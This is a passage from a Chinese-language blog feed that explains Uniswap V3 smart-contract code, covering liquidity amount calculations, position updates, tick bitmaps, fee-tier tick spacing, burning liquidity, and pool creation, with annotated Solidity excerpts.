TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  _slot0.sqrtPriceX96,<br>                  params.liquidityDelta<br>              );<br><br>//<br>              liquidity = LiquidityMath.addDelta(liquidityBefore, params.liquidityDelta);<br>          } else {<br>              // current tick is above the passed range; liquidity can only become in range by crossing from right to<br>              // left, when we'll need _more_ token1 (it's becoming more valuable) so user must provide it<br>              //如果trick超过了trickupper则此时所有的token0将转变为token1<br>              //使用TickMath 库中的 getSqrtRatioAtTick 来通过 tick index 计算其所对应的价格<br>              amount1 = SqrtPriceMath.getAmount1Delta(<br>                  TickMath.getSqrtRatioAtTick(params.tickLower),<br>                  TickMath.getSqrtRatioAtTick(params.tickUpper),<br>                  params.liquidityDelta<br>              );<br>          }<br>      }<br>  }<br><br></code></pre></td></tr></table></figure><h3 id="getAmountDelta"><a href="#getAmountDelta" class="headerlink" title="getAmountDelta"></a>getAmountDelta</h3><p>在 <code>SqrtPriceMath</code> 库中</p><p>在具体的计算过程中，分成了 RoundUp 和 RoundDown 两种情况，简单来说：</p><ol><li>当提供/增加流动性时，会使用 RoundUp，这样可以保证增加数量为 L 的流动性时，用户提供足够的 token 到 pool 中</li><li>当移除/减少流动性时，会使用 RoundDown，这样可以保证减少数量为 L 的流动性时，不会从 pool 中给用户多余的 token</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    /// @notice Gets the amount0 delta between two prices<br>    /// @dev Calculates liquidity / sqrt(lower) - liquidity / sqrt(upper),<br>    /// i.e. liquidity * (sqrt(upper) - sqrt(lower)) / (sqrt(upper) * sqrt(lower))<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The amount of usable liquidity<br>    /// @param roundUp Whether to round the amount up or down<br>    /// @return amount0 Amount of token0 required to cover a position of size liquidity between the two passed prices<br>    function getAmount0Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        uint128 liquidity,<br>        bool roundUp<br>    ) internal pure returns (uint256 amount0) {<br>        if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br><br>        uint256 numerator1 = uint256(liquidity) &lt;&lt; FixedPoint96.RESOLUTION;<br>        uint256 numerator2 = sqrtRatioBX96 - sqrtRatioAX96;<br><br>        require(sqrtRatioAX96 &gt; 0);<br><br>        return<br>            roundUp<br>            //返回ceil(x / y)<br>                ? UnsafeMath.divRoundingUp(<br>                //numerator1*numerator2/sqrtRatioBX96并取整<br>                    FullMath.mulDivRoundingUp(numerator1, numerator2, sqrtRatioBX96),<br>                    sqrtRatioAX96<br>                )<br>                : FullMath.mulDiv(numerator1, numerator2, sqrtRatioBX96) / sqrtRatioAX96;<br>    }<br><br>    /// @notice Gets the amount1 delta between two prices<br>    /// @dev Calculates liquidity * (sqrt(upper) - sqrt(lower))<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The amount of usable liquidity<br>    /// @param roundUp Whether to round the amount up, or down<br>    /// @return amount1 Amount of token1 required to cover a position of size liquidity between the two passed prices<br>    function getAmount1Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        uint128 liquidity,<br>        bool roundUp<br>    ) internal pure returns (uint256 amount1) {<br>        if (sqrtRatioAX96 &gt; sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);<br><br>        return<br>            roundUp<br>                ? FullMath.mulDivRoundingUp(liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96)<br>                : FullMath.mulDiv(liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96);<br>    }<br>    <br>    /// @notice Helper that gets signed token0 delta<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The change in liquidity for which to compute the amount0 delta<br>    /// @return amount0 Amount of token0 corresponding to the passed liquidityDelta between the two prices<br>    function getAmount0Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        int128 liquidity<br>    ) internal pure returns (int256 amount0) {<br>        return<br>            liquidity &lt; 0<br>                ? -getAmount0Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(-liquidity), false).toInt256()<br>                : getAmount0Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(liquidity), true).toInt256();<br>    }<br><br>    /// @notice Helper that gets signed token1 delta<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The change in liquidity for which to compute the amount1 delta<br>    /// @return amount1 Amount of token1 corresponding to the passed liquidityDelta between the two prices<br>    function getAmount1Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        int128 liquidity<br>    ) internal pure returns (int256 amount1) {<br>        return<br>            liquidity &lt; 0<br>                ? -getAmount1Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(-liquidity), false).toInt256()<br>                : getAmount1Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(liquidity), true).toInt256();<br>    }<br>}<br></code></pre></td></tr></table></figure><h2 id="updatePosition"><a href="#updatePosition" class="headerlink" title="_updatePosition"></a>_updatePosition</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Gets and updates a position with the given liquidity delta<br>/// @param owner the owner of the position<br>/// @param tickLower the lower tick of the position's tick range<br>/// @param tickUpper the upper tick of the position's tick range<br>/// @param tick the current tick, passed to avoid sloads<br>function _updatePosition(<br>    address owner,<br>    int24 tickLower,<br>    int24 tickUpper,<br>    int128 liquidityDelta,<br>    int24 tick<br>) private returns (Position.Info storage position) {<br>//获取用户的position<br>    position = positions.get(owner, tickLower, tickUpper);<br><br>    uint256 _feeGrowthGlobal0X128 = feeGrowthGlobal0X128; // SLOAD for gas optimization<br>    uint256 _feeGrowthGlobal1X128 = feeGrowthGlobal1X128; // SLOAD for gas optimization<br><br>    // if we need to update the ticks, do it<br>    //根据传入的参数修改position中的lower/upper tick<br>    bool flippedLower;<br>    bool flippedUpper;<br>    if (liquidityDelta != 0) {<br>        uint32 time = _blockTimestamp();<br>        //获取请求时间点的Oracle数据<br>        (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) =<br>            observations.observeSingle(<br>                time,<br>                0,<br>                slot0.tick,<br>                slot0.observationIndex,<br>                liquidity,<br>                slot0.observationCardinality<br>            );<br><br>        // 更新 lower tikc 和 upper tick<br>    // fippedX 变量表示是此 tick 的引用状态是否发生变化，即<br>    // 被引用 -&gt; 未被引用 或<br>    // 未被引用 -&gt; 被引用<br>    // 后续需要根据这个变量的值来更新 tick 位图<br>        flippedLower = ticks.update(<br>            tickLower,<br>            tick,<br>            liquidityDelta,<br>            _feeGrowthGlobal0X128,<br>            _feeGrowthGlobal1X128,<br>            secondsPerLiquidityCumulativeX128,<br>            tickCumulative,<br>            time,<br>            false,<br>            maxLiquidityPerTick<br>        );<br>        flippedUpper = ticks.update(<br>            tickUpper,<br>            tick,<br>            liquidityDelta,<br>            _feeGrowthGlobal0X128,<br>            _feeGrowthGlobal1X128,<br>            secondsPerLiquidityCumulativeX128,<br>            tickCumulative,<br>            time,<br>            true,<br>            maxLiquidityPerTick<br>        );<br><br>        // 如果一个 tick 第一次被引用，或者移除了所有引用<br>    // 那么更新 tick 位图<br>        if (flippedLower) {<br>            tickBitmap.flipTick(tickLower, tickSpacing);<br>        }<br>        if (flippedUpper) {<br>            tickBitmap.flipTick(tickUpper, tickSpacing);<br>        }<br>    }<br><br>    (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) =<br>        ticks.getFeeGrowthInside(tickLower, tickUpper, tick, _feeGrowthGlobal0X128, _feeGrowthGlobal1X128);<br><br>    //更新position<br>    position.update(liquidityDelta, feeGrowthInside0X128, feeGrowthInside1X128);<br><br>    // clear any tick data that is no longer needed<br>    // 如果移除了对 tick 的引用，那么清除之前记录的元数据<br>// 这只会发生在移除流动性的操作中<br>    if (liquidityDelta &lt; 0) {<br>        if (flippedLower) {<br>            ticks.clear(tickLower);<br>        }<br>        if (flippedUpper) {<br>            ticks.clear(tickUpper);<br>        }<br>    }<br>}<br><br></code></pre></td></tr></table></figure><h3 id="tick"><a href="#tick" class="headerlink" title="tick"></a>tick</h3><p>V3使用的等幂数列</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">p_{i}=<span class="hljs-number">1.0001</span><span class="hljs-symbol">^i</span><br><span class="hljs-comment">//调整一下</span><br>√p_{i}=(√<span class="hljs-number">1.0001</span>)<span class="hljs-symbol">^i</span><br></code></pre></td></tr></table></figure><p>这里的 <code>i</code> 也就是价格的序号，我们称之为 <code>tick</code>，而由所有序号组成的集合称之为 <code>Ticks</code>。在合约代码中，主要是以 tick 来记录流动性的区间。</p><p>在 <code>UniswapV3Pool</code> 合约中有两个状态变量记录了 tick 相关的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    // tick 元数据管理的库<br>    using Tick for mapping(int24 =&gt; Tick.Info);<br>    // tick 位图槽位的库<br>    using TickBitmap for mapping(int16 =&gt; uint256);<br><br>    // 记录了一个 tick 包含的元数据，这里只会包含所有 Position 的 lower/upper ticks<br>    mapping(int24 =&gt; Tick.Info) public override ticks;<br>    // tick 位图，因为这个位图比较长（一共有 887272x2 个位），大部分的位不需要初始化<br>    // 因此分成两级来管理，每 256 位为一个单位，一个单位称为一个 word<br>    // map 中的键是 word 的索引<br>    mapping(int16 =&gt; uint256) public override tickBitmap;<br><br>library Tick {<br>    ...<br>    // tick 中记录的数据<br>    struct Info {<br>        // 记录了所有引用这个 tick 的 position 流动性的和<br>        uint128 liquidityGross;<br>        // 当此 tick 被越过时（从左至右），池子中整体流动性需要变化的值<br>        int128 liquidityNet;<br>        ...<br>    }<br></code></pre></td></tr></table></figure><p>tick 位图用于记录所有被引用的 lower/upper tick index，我们可以用过 tick 位图，从当前价格找到下一个（从左至右或者从右至左）被引用的 tick index。</p><p><a href="https://github.com/Uniswap/uniswap-v3-core/blob/2dc1eb9f251bad1c260d22dd392d8cedb2c6a4b5/contracts/libraries/TickBitmap.sol">tick 位图</a>有以下几个特性：</p><ul><li>对于不存在的 tick，不需要初始值，因为访问 map 中不存在的 key 默认值就是 0</li><li>通过对位图的每个 word(uint256) 建立索引来管理位图，即访问路径为 word index -&gt; word -&gt; tick bit</li></ul><p><code>liquidityGross</code>: 很好理解，每当有流动性将该 tick 设为价格区间时，不论是价格上限还是价格下限， <code>liquidityGross</code> 都会增加。换言之，当 <code>liquidityGross &gt; 0</code> 说明该 tick 已经初始化，正在被流动性使用，而 <code>liquidityGross == 0</code> 则该 tick 未初始化，没有流动性使用，计算时可以忽略。</p><p><code>liquidityNet</code> 表示当价格从左至右经过此 tick 时整体流动性需要变化的净值。在单个流动性中，对于 lower tick 来说，它的值为正，对于 upper tick 来说它的值为 负。</p><p>在注入或移除数量为 <code>l</code> 的流动性时，具体规则如下：</p><ul><li>注入流动性，tick 是价格下限，<code>liquidityNet</code> 增加 <code>l</code></li><li>注入流动性，tick 是价格上限，<code>liquidityNet</code> 减少 <code>l</code></li><li>移除流动性，tick 是价格下限，<code>liquidityNet</code> 减少 <code>l</code></li><li>移除流动性，tick 是价格上限，<code>liquidityNet</code> 增加 <code>l</code></li></ul><p>在Tick.sol中，update用于更新 tick 元数据，此函数返回的 flipped 表示此 tick 的引用状态是否发生变化，之前的 <code>_updatePosition</code> 中的代码会根据这个返回值去更新 tick 位图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function update(<br>    mapping(int24 =&gt; Tick.Info) storage self,<br>    int24 tick,<br>    int24 tickCurrent,<br>    int128 liquidityDelta,<br>    uint256 feeGrowthGlobal0X128,<br>    uint256 feeGrowthGlobal1X128,<br>    uint160 secondsPerLiquidityCumulativeX128,<br>    int56 tickCumulative,<br>    uint32 time,<br>    bool upper,<br>    uint128 maxLiquidity<br>) internal returns (bool flipped) {<br>    Tick.Info storage info = self[tick];<br><br>    uint128 liquidityGrossBefore = info.liquidityGross;<br>    uint128 liquidityGrossAfter = LiquidityMath.addDelta(liquidityGrossBefore, liquidityDelta);<br><br>    require(liquidityGrossAfter &lt;= maxLiquidity, 'LO');<br><br>    //通过 liquidityGross 在进行 position 变化前后的值来判断 tick 是否仍被引用<br>    flipped = (liquidityGrossAfter == 0) != (liquidityGrossBefore == 0);<br><br>    if (liquidityGrossBefore == 0) {<br>        // by convention, we assume that all growth before a tick was initialized happened _below_ the tick<br>        if (tick &lt;= tickCurrent) {<br>            info.feeGrowthOutside0X128 = feeGrowthGlobal0X128;<br>            info.feeGrowthOutside1X128 = feeGrowthGlobal1X128;<br>            info.secondsPerLiquidityOutsideX128 = secondsPerLiquidityCumulativeX128;<br>            info.tickCumulativeOutside = tickCumulative;<br>            info.secondsOutside = time;<br>        }<br>        info.initialized = true;<br>    }<br><br>    info.liquidityGross = liquidityGrossAfter;<br><br>    // when the lower (upper) tick is crossed left to right (right to left), liquidity must be added (removed)<br>    //更新liquidityNet的值<br>    info.liquidityNet = upper<br>        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()<br>        : int256(info.liquidityNet).add(liquidityDelta).toInt128();<br>}<br><br></code></pre></td></tr></table></figure><h3 id="tickspacing"><a href="#tickspacing" class="headerlink" title="tickspacing"></a>tickspacing</h3><p>V3 引入了费率三档可选等级和相应的 <code>tick</code> 疏密程度，也就是 <code>tickspacing</code> 。对于每一种交易对而言，都有三档可选费率等级，0.05%, 0.3%, 1%，并且以后通过社区治理，还有可能永久增加可选的挡位。每种交易费率等级都由给定的 tickspacing，比如稳定币交易对，就是 tick 之间需要间隔 10 个才是有效的可使用的 tick 。位于间隔内的 tick 虽然存在，但程序不会去初始化和使用，也就不会产生 gas 费用。因此，我们在等幂数列的基础上，进一步节省了计算消耗。</p><table><thead><tr><th align="left">费率</th><th align="left">tickspacing</th><th align="left">建议的使用范围</th></tr></thead><tbody><tr><td align="left">0.05%</td><td align="left">10</td><td align="left">稳定币交易对</td></tr><tr><td align="left">0.3%</td><td align="left">60</td><td align="left">适用大多数交易对</td></tr><tr><td align="left">1%</td><td align="left">200</td><td align="left">波动极大的交易对</td></tr></tbody></table><p>在UniswapV3Factory.sol中设定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(uint24 =&gt; int24) public override feeAmountTickSpacing;<br><br>constructor() {<br>       owner = msg.sender;<br>       emit OwnerChanged(address(0), msg.sender);<br><br>       feeAmountTickSpacing[500] = 10;<br>       emit FeeAmountEnabled(500, 10);<br>       feeAmountTickSpacing[3000] = 60;<br>       emit FeeAmountEnabled(3000, 60);<br>       feeAmountTickSpacing[10000] = 200;<br>       emit FeeAmountEnabled(10000, 200);<br>   }<br></code></pre></td></tr></table></figure><h1 id="移除流动性"><a href="#移除流动性" class="headerlink" title="移除流动性"></a>移除流动性</h1><p>在合约UniswapV3Pool中，burn用来实现流动性的移除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function burn(<br>    int24 tickLower,<br>    int24 tickUpper,<br>    uint128 amount<br>) external override lock returns (uint256 amount0, uint256 amount1) {<br>//计算需要移除的token数<br>    (Position.Info storage position, int256 amount0Int, int256 amount1Int) =<br>        _modifyPosition(<br>            ModifyPositionParams({<br>                owner: msg.sender,<br>                tickLower: tickLower,<br>                tickUpper: tickUpper,<br>                liquidityDelta: -int256(amount).toInt128()<br>            })<br>        );<br><br>    amount0 = uint256(-amount0Int);<br>    amount1 = uint256(-amount1Int);<br><br>    //注意这里，移除流动性后，将移出的 token 数记录到了 position.tokensOwed 上<br>    if (amount0 &gt; 0 || amount1 &gt; 0) {<br>        (position.tokensOwed0, position.tokensOwed1) = (<br>            position.tokensOwed0 + uint128(amount0),<br>            position.tokensOwed1 + uint128(amount1)<br>        );<br>    }<br><br>    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);<br>}<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap Part Ⅰ | 创建交易对</title>
    <link href="/2022/08/20/Uniswap%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E5%88%9B%E5%BB%BA%E4%BA%A4%E6%98%93%E5%AF%B9/"/>
    <url>/2022/08/20/Uniswap%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E5%88%9B%E5%BB%BA%E4%BA%A4%E6%98%93%E5%AF%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="创建交易对"><a href="#创建交易对" class="headerlink" title="创建交易对"></a>创建交易对</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">title:CreatePool<br>User-&gt;NonfungiblePositionManager:createAndInitializePoolIfNecessary(token0,token1,fee,√p) <br>NonfungiblePositionManager-&gt;UniswapV3Factory:createPool<br>UniswapV3Factory-&gt;UniswapV3Pool:deploy<br>NonfungiblePositionManager-&gt;UniswapV3Pool:initialize<br></code></pre></td></tr></table></figure><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>NonfungiblePositionManager中有一些全局变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev IDs of pools assigned by this contract<br>//_poolIds记录所有交易池的地址和编号的对应关系<br>mapping(address =&gt; uint80) private _poolIds;<br><br>/// @dev Pool keys by pool ID, to save on SSTOREs for position data<br>//_poolIdToPoolKey记录交易池编号和PoolKey的对应关系。PoolKey中包含了token0，token1，fee<br>mapping(uint80 =&gt; PoolAddress.PoolKey) private _poolIdToPoolKey;<br><br>/// @dev The token ID position data<br>mapping(uint256 =&gt; Position) private _positions;<br><br>/// @dev The ID of the next token that will be minted. Skips 0<br>//position的编号<br>uint176 private _nextId = 1;<br>/// @dev The ID of the next pool that is used for the first time. Skips 0<br>//每一个Pool的唯一编号<br>uint80 private _nextPoolId = 1;<br><br>/// @dev The address of the token descriptor contract, which handles generating token URIs for position tokens<br>address private immutable _tokenDescriptor;<br></code></pre></td></tr></table></figure><p>还有一个构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">constructor(<br>    address _factory, //UniswapV3Factory的地址<br>    address _WETH9, //ETH智能合约的地址<br>    address _tokenDescriptor_ //ERC721描述信息的接口地址<br>) ERC721Permit(&#x27;Uniswap V3 Positions NFT-V1&#x27;, &#x27;UNI-V3-POS&#x27;, &#x27;1&#x27;) PeripheryImmutableState(_factory, _WETH9) &#123;<br>    _tokenDescriptor = _tokenDescriptor_;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="createAndInitializePoolIfNecessary"><a href="#createAndInitializePoolIfNecessary" class="headerlink" title="createAndInitializePoolIfNecessary"></a>createAndInitializePoolIfNecessary</h2><p>NonfungiblePositionManager合约继承了抽象合约PoolInitializer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract NonfungiblePositionManager is<br>    INonfungiblePositionManager,<br>    Multicall,<br>    ERC721Permit,<br>    PeripheryImmutableState,<br>    PoolInitializer,<br>    LiquidityManagement,<br>    PeripheryValidation,<br>    SelfPermit<br>&#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>createAndInitializePoolIfNecessary方法写在抽象合约PoolInitializer中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @title Creates and initializes V3 Pools<br>abstract contract PoolInitializer is IPoolInitializer, PeripheryImmutableState &#123;<br>    /// @inheritdoc IPoolInitializer<br>    function createAndInitializePoolIfNecessary(<br>        address token0,<br>        address token1,<br>        uint24 fee,<br>        uint160 sqrtPriceX96<br>    ) external payable override returns (address pool) &#123;<br>        require(token0 &lt; token1);<br>        //查看交易对是否已经创建<br>        pool = IUniswapV3Factory(factory).getPool(token0, token1, fee);<br><br>        if (pool == address(0)) &#123;<br>            pool = IUniswapV3Factory(factory).createPool(token0, token1, fee);<br>            IUniswapV3Pool(pool).initialize(sqrtPriceX96);<br>        &#125; else &#123;<br>            (uint160 sqrtPriceX96Existing, , , , , , ) = IUniswapV3Pool(pool).slot0();<br>            if (sqrtPriceX96Existing == 0) &#123;<br>                IUniswapV3Pool(pool).initialize(sqrtPriceX96);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="getPool"><a href="#getPool" class="headerlink" title="getPool"></a>getPool</h3><p>IUniswapV3Factory中的getPool函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist<br>/// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order<br>/// @param tokenA The contract address of either token0 or token1<br>/// @param tokenB The contract address of the other token<br>/// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip<br>/// @return pool The pool address<br>function getPool(<br>    address tokenA,<br>    address 